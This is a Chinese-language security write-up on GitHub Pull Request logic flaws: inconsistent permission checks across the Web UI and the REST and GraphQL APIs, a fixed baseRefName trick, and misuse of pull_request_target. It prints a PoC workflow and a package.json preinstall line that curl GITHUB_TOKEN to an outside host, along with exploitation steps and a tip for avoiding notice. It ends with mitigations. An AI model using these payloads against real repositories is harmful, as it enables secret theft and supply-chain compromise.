---
slug: /github-security
title: GitHub 安全
icon: github-icon
sidebar_position: 25
---

最近看了几个 GitHub Pull Request 相关的漏洞，觉得很有意思，也能侧面反映当前业界在业务逻辑风险方面的一些现状，记录分享出来。

<!-- truncate -->

## GitHub Pull Request风险之逻辑实现不一致

**相同功能在不同入口或不同阶段的实现逻辑若不一致，攻击者可通过绕过严格入口直接调用宽松入口来获取本不应拥有的权限。**

![](./image-1-1024x795.webp)

正常情况下，我们在GitHub给某个开源项目A提交一个Pull Request时，会有一个“Allow edits by maintainers”的选项且默认选中。这个选项的主要作用是让项目A（Base Repository）的维护者可以有权限修改被我Fork后的项目（Head Repository）分支。

![](./image-2-1024x593.webp)

另外可以发现，无需拥有项目Base Repository或Head Repository权限即可随意创建Pull Request，限制了Head Repository必须是fork自Base Repository。

那么有没有可能把我自己的公开仓库作为Base Repository，随意选一个其它的仓库作为Head Repository来创建Pull Request，就能使我拥有他人仓库（Head Repository）的权限了？

在Web界面上的Head Repository只能选择Fork仓库，且该Fork仓库必须是Fork自Base Repository。利用Web和REST API的差异，可以通过[GitHub REST API来创建Pull Request](https://docs.github.com/en/rest/reference/pulls#create-a-pull-request)传入任何仓库，但在开启“Allow edits by maintainers”（REST API参数为`maintainer_can_modify`）选项调用后无法创建成功，提示没有权限，显然GitHub做了权限控制，除非我有Head Repository的权限才能创建成功。

**创建Pull Request时有做权限控制，有没有可能修改的时候没做到一致的权限控制** 。于是通过创建Pull Request的时候不开启“Allow edits by maintainers”选项，等Pull Request正常创建完，再通过[修改Pull Request接口去更新该选项的状态](https://docs.github.com/en/rest/reference/pulls#update-a-pull-request)，成功获得了对应的他人仓库（Head Repository）的写入权限。

此时可以实现获得GitHub上所有带有Fork标记（仓库名下有提示`forked from apache/cordova`）的仓库写入权限。

以上是利用自己的仓库作为Base Repository，以他人带有Fork标记的仓库作为Head Repository，并创建Pull Request，从而获得他人仓库的写入权限。核心利用了**Web界面和REST API逻辑实现差异** 以及**创建和修改阶段权限检查差异** 实现。

那除了Web界面和REST API，是否还有其它实现也存在漏洞？

最后发现GitHub还有GraphQL API，使用[GraphQL API去修改Pull Request](https://docs.github.com/en/graphql/reference/mutations#updatepullrequest)一样行得通，且不仅能将自己创建的Pull Request的“Allow edits by maintainers”选项打开，还能打开他人创建的Pull Request的“Allow edits by maintainers”选项，也就是检查修改者是否为Pull Request创建者的逻辑在GraphQL中也被忽略了。

该漏洞在今年初的时候由Teddy Katz发现，并上报给GitHub安全团队，并奖励了30000美元，目前该漏洞已修复，详情可见[Messing with GitHub’s fork collaboration for fun and profit](https://blog.teddykatz.com/2021/03/10/fork-collab-abuse.html)。

在上面漏洞里存在两个通用业务逻辑风险：**相同功能在不同的位置和不同的阶段的逻辑实现不一致所导致的业务逻辑风险。**

- **同一功能不同位置的实现逻辑不一致** 。

- **同一功能不同协议的实现逻辑不一致** 。比如Web界面、REST API、GraphQL API中对Pull Request的选项控制逻辑实现不一致。
- **同一功能不同位置的实现逻辑不一致** 。比如支付时在Web端需要输入支付密码，而在App端无需输入密码。
- **同一功能不同阶段的实现逻辑不一致** 。

- **创建和后续状态变更的实现逻辑不一致** 。比如在创建Pull Request时权限控制的很好，但在后续更改Pull Request时没有权限控制。
- **流程中的每一步的基础要求逻辑不一致** 。比如要申请某个礼物，正常流程要经过某几个人审批，但最终保存申请记录的步骤并未验证前面的审批流程，导致流程绕过风险。

这类风险在GitHub内应该大量存在，对于各厂商有比较大的实际风险价值，尤其是提供了多种协议实现、多种端，以及存在大量创建和修改的业务逻辑、大量的流程步骤业务，应当好好自查下。

## GitHub Pull Request风险之预设条件不一致

**每个功能模块的安全性往往依赖对其他模块行为的某种假设，一旦该假设在现实中不成立，安全边界即告崩溃。**

GitHub Actions是一个内置于GitHub的自动化平台，支持当仓库发生一些事件时触发在沙箱中执行一些任务。这些工作流程被配置在`github.com/REPO_NAME/.github/workflows/`下，工作流内容以及运行状态所有人可见。比如当向仓库Push代码时可以执行代码测试任务。GitHub Actions支持的事件包括`push`、`fork`、`issues`、`pull_request`等，详细列表见[GitHub事件触发文档](https://docs.github.com/en/actions/reference/events-that-trigger-workflows)。简而言之GitHub Actions是git hook的强化Web实现，每个GitHub仓库都可以免费使用。

执行某些任务必然就需要用到身份标识，但又不能硬编码在代码中，因此GitHub提供了[密钥配置](https://docs.github.com/cn/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-environment)功能，允许用户在仓库、组织和账户层面的设置功能中创建一些密钥，这些密钥可以在GitHub Actions中通过`${{secrets.SecretName }}`来引用。其中有一个默认存在的密钥[GITHUB_TOKEN](https://docs.github.com/cn/actions/reference/authentication-in-a-workflow)，其[默认权限](https://docs.github.com/cn/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)可以进行仓库的修改操作，其无需显式生成或调用，自动在每个任务的生命周期开始时创建，结束时销毁。

在Pull Request场景下存在两个关键事件：

- `pull_request`事件能够在有人提交Pull Request时触发工作流任务，外部提交的代码合并后也可以工作，但考虑到合并进来的代码并不一定是安全的，因此该事件下的任务无法访问任何密钥。
- `pull_request_target`还是有场景需要访问密钥的，于是[GitHub增加该事件](https://github.blog/2020-08-03-github-actions-improvements-for-fork-and-pull-request-workflows/)，触发逻辑和`pull_request`一样，差异点限制在源仓库（Base Repository）自身分支下运行代码，而不能在提交的Pull Request合并分支中运行。也就是说攻击者提交的含有恶意代码的Pull Request分支的代码根本就不运行。其认为运行源仓库的分支代码是安全可控的，因此允许访问密钥信息。

**也就是说如果想要盗取密钥，只能在** `pull_request_target`**事件下执行工作流，而该事件下仅运行源仓库（Base Repository）的分支代码，不运行Fork后仓库的代码。**

在正常情况下，Base Repository指向的是master分支。在通过[GraphQL API创建Pull Request](https://docs.github.com/en/graphql/reference/mutations#createpullrequest)时，`baseRefName`为字符串。如果改为提交的Hash（Commit Hash）是否行得通？

```
mutation {
  createPullRequest(input: {
    title: "Update README.md"
    # 此处不填写分支名，而改为Commit Hash
    baseRefName: "fd9cfdc590e789ae559b5a7878e7e6b929a249d9"
    headRefName: "FeeiCN/codova:patch-1"
  })
}
```

结果显示参数`baseRefName`限制了只能是分支名称。

```
{
  "errors": [{ "message": "Base ref must be a branch" }]
}
```

结合上一个漏洞中的通用业务逻辑风险：**创建和后续状态变更的实现逻辑不一致** 。我们看看提交一个正常Pull Request后，再通过GraphQL API修改Pull Request的`baseRefName`为Commit Hash，最终成功了实现了修改。

在GitHub里有个背景知识，**Fork的仓库和其原始仓库共享一套提交Hash（Commit Hash）** 。

基于此背景，可以将Pull Request的`baseRefName`修改为Fork之后仓库的Commit Hash，从而使`pull_request_target`事件下运行Fork后的仓库代码，以实现盗取密钥的能力。

**利用方式：**

1. 找到某个使用了GitHub Actions的公开仓库
2. Fork该仓库后，随意修改一个文件，创建一个Pull Request请求
3. 在Fork后的仓库中，创建并提交一个`.github/workflows/pr.yml`文件，内容如下，记录Commit Hash

```
name: 盗取密钥PoC

on:
  pull_request

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Create issue using REST API
        run: 
          curl --request GET \
          --url https://feei.cn/${{ github.repository }}/${{ secrets.GITHUB_TOKEN }} \
          --fail
```

1. 通过GraphQL API将步骤2中的Pull Request的`baseRefName`改为步骤3中的Commit Hash
2. 然后工作流任务就运行了，网站就可以接收到密钥了

相较于上一个漏洞，这个漏洞所造成的危害范围会大很多。可以拿到所有GitHub公开仓库的写入权限和密钥配置信息。恶意利用来修改官方仓库，植入恶意后门，形成开源软件的供应链攻击，几乎所有企业都受其影响。恶意利用盗取的各类密钥也能造成较大危害，比如盗取AWS密钥来控制生产服务器。

该漏洞在今年初的时候由Teddy Katz发现，并上报给GitHub安全团队，并奖励了25000美元，目前该漏洞已修复，详情可以[Stealing arbitrary GitHub Actions secrets](https://blog.teddykatz.com/2021/03/17/github-actions-write-access.html)。

在上面的漏洞中存在一个通用的业务逻辑风险：**单一来看某个功能是安全的，全局来看是有风险的。**

站在开发Pull Request的工程师视角，允许仓库合并分支为Commit Hash没有任何安全问题，在它的角度可能并不知道Fork后的仓库和源仓库是共享一套Commit Hash的，这套机制可能又是另外一个负责Commit的人负责的，他的安全性是依赖另外一个假设，这个假设可能随着时间推移随时发生变化，当实际过程中条件和预想的不一致时，风险就出来了。

此风险的可怕之处是，单看风险是不可见的，当前业内的各类安全评估和防护能力都无法解决这类风险，给安全团队带来极大的挑战。无论是对应研发安全意识很强还是安全工程师很资深，也不一定能发现此类风险。

## GitHub Pull Request风险之安全背景不一致

**平台提供了安全使用的选项和警告，但一旦将安全决策的责任交给使用者，不同背景和认知水平的研发会产生截然不同的理解，风险因此系统性地存在。**

当上面两个风险彻底修复后，基于已有的GitHub Actions和Secrets现状，还是存在风险的，只不过不再是GitHub平台本身的风险，而是GitHub Actions使用不当的风险。

在[GitHub官方文档pull_request_target章节中](https://docs.github.com/en/actions/reference/events-that-trigger-workflows#pull_request_target)有显著的warning提示，但你一定要相信没有设计层面技术手段去限制，一定会有人自动忽略该提示，我们并不能期望每个人都能按照预期去理解我们希望他理解的内容。尤其当涉及大量仓库后，一个有多重利用条件的风险也变得不那么难找，并且会持续存在。

GitHub Actions本身支持很灵活的任务，如果任务中主动配置了拉取最新代码，并执行外部贡献者提交的代码，即有可能导致GITHUB_TOKEN及其它密钥泄漏继而引起仓库被修改风险。

**利用条件：**

1. 存在GitHub Actions，也就是仓库根目录中有`.github/workflows/`文件夹。且该文件夹下的`*.yml`文件中含有`pull_request_target`事件。
2. 在`jobs`:`steps`中存在**拉取最新代码** 的操作，比如`uses: actions/checkout`，且需要显式的指向`pull_request`分支，比如`ref: ${{github.event.pull_request.head.ref}}`。
3. 在`jobs`:`steps`中存在**运行仓库代码** 相关的操作，比如`yarn`/`npm`会触发安装`package.json`中的`preinstall`/`postinstall`的代码。或者直接执行了仓库中某个路径的代码，比如`./scripts/deploy.sh`等。
4. 实际情况中最重要是要先看目标仓库的GitHub Actions界面中历史任务是否有运行成功。

```
# Example of Pull Request Target Vulnerability
# file path: github.com/GSIL/.github/workflows/pr.yml
name: Example of Pull Request Target Vulnerability
on:
  pull_request_target

jobs:
  tests:
    name: Tests
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      with:
          ref: ${{github.event.pull_request.head.ref}}
          repository: ${{github.event.pull_request.head.repo.full_name}}
      - uses: actions/setup-node@v2
        with:
          node-version: 12.x
      - name: Install dependencies
      	run: yarn
      - name: E2E Test
        run: yarn e2e
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          # 需要特别注意的是，各阶段的环境变量并不是相互共享的（如果环境变量定义在jobs层则例外）
```

**利用方式：**

1. fork目标仓库，或直接在GitHub上点击修改目标仓库文件（此时GitHub会默认fork仓库）。
2. 修改对应执行代码。假设其为nodejs项目会执行安装操作，我们就可以修改目标仓库根目录下的`package.json`文件，在`scripts`中增加一行`"preinstall": "curl https://feei.cn/trigger_vul_prt`printenv GITHUB_TOKEN`"`。（此处要注意，直接修改GitHub Actions任务里的代码并不能起效果，因为它触发的原始仓库中的任务）
3. 提交Pull Request请求将自己修改的代码合并至目标仓库分支，此时会触发运行GitHub Actions任务。因为公开的仓库GitHub Actions的运行情况也是公开的，就可以在目标仓库的[GitHub Actions](https://github.com/FeeiCN/GSIL/actions/new)界面中查看任务运行状态，确定运行正常结束后，即可通过接收服务查看密钥内容。（在实际利用过程中要注意一点，在提交Pull Request时往往目标仓库相关人员能收到邮件信息，可以通过fork目标仓库，并用第二个GitHub账号来测试fork后的仓库漏洞情况，确认无误后在去利用目标仓库）

**由于该漏洞并非GitHub官方问题，而是使用者滥用，因此需要使用者自行修复：**

- 如果能使用`pull_request`则不要使用`pull_request_target`。
- 如果用了`pull_request_target`，则不要在任务中拉取、构建、运行不受信任的代码。具体点就是不要在任务中使用`actions/checkout`拉取代码，否则后续一切都会变得不可控。
- 一定需要使用`actions/checkout`时，将`persist-credentials`参数设置为`false`以避免储存仓库密钥。
- 严格限定`pull_request_target`执行条件。外部贡献者往往没有自定义标签能力，可以在Pull Request被加上某个标签才可以运行。比如必须人工Code Review后打上`Safety`标签，`if: contains(github.event.pull_request.labels.*.name, 'Safety')`。

此漏洞的影响和上一个漏洞一致，都是可以拥有仓库的写入权限并能拿到各类密钥。

该漏洞在由[GitHub安全实验室发布](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)，并作为通用风险，有兴趣可以看看几个实际的案例详情[GHSL-2021-033](https://securitylab.github.com/advisories/GHSL-2021-033-game-ci-workflows/)、[GHSL-2020-364](https://securitylab.github.com/advisories/GHSL-2020-364-apache-incubator-superset-workflow/)、[GHSL-2021-005](https://securitylab.github.com/advisories/GHSL-2021-005-openrefine-workflows/)、[GHSL-2021-003](https://securitylab.github.com/advisories/GHSL-2021-003-alisw-workflows/)。

该漏洞同样存在一个通用的业务逻辑风险：**一些风险是技术手段无法规避了，依赖给研发的一些安全要求和提示，但研发往往是按照自己对于安全的认识去开发逻辑的** 。一个安全要求不同的研发有不同的处境、不同的研发想看的并不一样、接受度也不一样。一旦将安全选择交给研发，一切都变得不安全了。
